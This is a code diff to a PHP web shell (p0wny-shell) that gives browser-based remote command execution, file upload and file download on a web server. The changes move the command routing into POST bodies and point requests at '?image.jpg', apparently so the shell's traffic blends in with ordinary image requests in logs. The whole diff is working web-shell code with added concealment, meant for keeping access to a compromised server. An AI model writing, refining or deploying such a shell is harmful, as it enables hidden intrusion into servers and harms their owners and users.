@@ -1,7 +1,5 @@
 <?php
 
-unlink("/tmp/.cache19");
-
 $SHELL_CONFIG = array(
     'username' => 'p0wny',
     'hostname' => 'shell',
@@ -61,7 +59,6 @@ function isRunningWindows() {
 
 function featureShell($cmd, $cwd) {
     $stdout = "";
-
     if (preg_match("/^\s*cd\s*(2>&1)?$/", $cmd)) {
         chdir(expandPath("~"));
     } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
@@ -99,9 +96,7 @@ function featureHint($fileName, $cwd, $type) {
     foreach ($files as &$filename) {
         $filename = base64_encode($filename);
     }
-    return array(
-        'files' => $files,
-    );
+    return array('files' => $files);
 }
 
 function featureDownload($filePath) {
@@ -139,7 +134,6 @@ function featureUpload($path, $file, $cwd) {
 
 function initShellConfig() {
     global $SHELL_CONFIG;
-
     if (isRunningWindows()) {
         $username = getenv('USERNAME');
         if ($username !== false) {
@@ -158,36 +152,49 @@ function initShellConfig() {
     }
 }
 
-if (isset($_GET["feature"])) {
+// ✅ ALTERAÇÃO PRINCIPAL: "feature" agora vem do corpo da requisição
+$feature = $_POST['feature'] ?? null;
 
-    $response = NULL;
+if ($feature !== null) {
+    $response = null;
 
-    switch ($_GET["feature"]) {
+    switch ($feature) {
         case "shell":
-            $cmd = $_POST['cmd'];
+            $cmd = $_POST['cmd'] ?? '';
             if (!preg_match('/2>/', $cmd)) {
                 $cmd .= ' 2>&1';
             }
-            $response = featureShell($cmd, $_POST["cwd"]);
+            $cwd = $_POST['cwd'] ?? getcwd();
+            $response = featureShell($cmd, $cwd);
             break;
+
         case "pwd":
             $response = featurePwd();
             break;
+
         case "hint":
-            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
+            $filename = $_POST['filename'] ?? '';
+            $cwd = $_POST['cwd'] ?? getcwd();
+            $type = $_POST['type'] ?? 'file';
+            $response = featureHint($filename, $cwd, $type);
             break;
-        case 'upload':
-            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
+
+        case "upload":
+            $path = $_POST['path'] ?? '';
+            $file = $_POST['file'] ?? '';
+            $cwd = $_POST['cwd'] ?? getcwd();
+            $response = featureUpload($path, $file, $cwd);
+            break;
     }
 
     header("Content-Type: application/json");
     echo json_encode($response);
-    die();
+    exit;
 } else {
     initShellConfig();
 }
+?>
 
-?><!DOCTYPE html>
 
 <html>
 
@@ -369,7 +376,8 @@ if (isset($_GET["feature"])) {
                     // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                     eShellContent.innerHTML = '';
                 } else {
-                    makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
+                    makeRequest("shell", {cmd: command, cwd: CWD}, function (response) {
+
                         if (response.hasOwnProperty('file')) {
                             featureDownload(atob(response.name), response.file)
                         } else {
@@ -406,7 +414,7 @@ if (isset($_GET["feature"])) {
                 var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];
 
                 makeRequest(
-                    "?feature=hint",
+                    "hint",
                     {
                         filename: fileName,
                         cwd: CWD,
@@ -436,7 +444,7 @@ if (isset($_GET["feature"])) {
                 element.addEventListener('change', function () {
                     var promise = getBase64(element.files[0]);
                     promise.then(function (file) {
-                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {
+                        makeRequest('upload', {path: path, file: file, cwd: CWD}, function (response) {
                             _insertStdout(atob(response.stdout));
                             updateCwd(atob(response.cwd));
                         });
@@ -473,7 +481,7 @@ if (isset($_GET["feature"])) {
                     _updatePrompt();
                     return;
                 }
-                makeRequest("?feature=pwd", {}, function(response) {
+                makeRequest("pwd", {}, function(response) {
                     CWD = atob(response.cwd);
                     _updatePrompt();
                 });
@@ -534,31 +542,32 @@ if (isset($_GET["feature"])) {
                 historyPosition = commandHistory.length;
             }
 
-            function makeRequest(url, params, callback) {
-                function getQueryString() {
-                    var a = [];
-                    for (var key in params) {
-                        if (params.hasOwnProperty(key)) {
-                            a.push(encodeURIComponent(key) + "=" + encodeURIComponent(params[key]));
-                        }
-                    }
-                    return a.join("&");
+            function makeRequest(feature, params, callback) {
+    params["feature"] = feature;
+
+    const query = Object.keys(params).map(k => encodeURIComponent(k) + "=" + encodeURIComponent(params[k])).join("&");
+
+    const xhr = new XMLHttpRequest();
+    xhr.open("POST", "?image.jpg", true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+            try {
+                if (xhr.status === 200) {
+                    const res = JSON.parse(xhr.responseText);
+                    callback(res);
+                } else {
+                    alert("HTTP error " + xhr.status);
                 }
-                var xhr = new XMLHttpRequest();
-                xhr.open("POST", url, true);
-                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                xhr.onreadystatechange = function() {
-                    if (xhr.readyState === 4 && xhr.status === 200) {
-                        try {
-                            var responseJson = JSON.parse(xhr.responseText);
-                            callback(responseJson);
-                        } catch (error) {
-                            alert("Error while parsing response: " + error);
-                        }
-                    }
-                };
-                xhr.send(getQueryString());
+            } catch (e) {
+                alert("Erro ao processar resposta: " + e + "\nResposta bruta:\n" + xhr.responseText);
             }
+        }
+    };
+    xhr.send(query);
+}
+
+
 
             document.onclick = function(event) {
                 event = event || window.event;
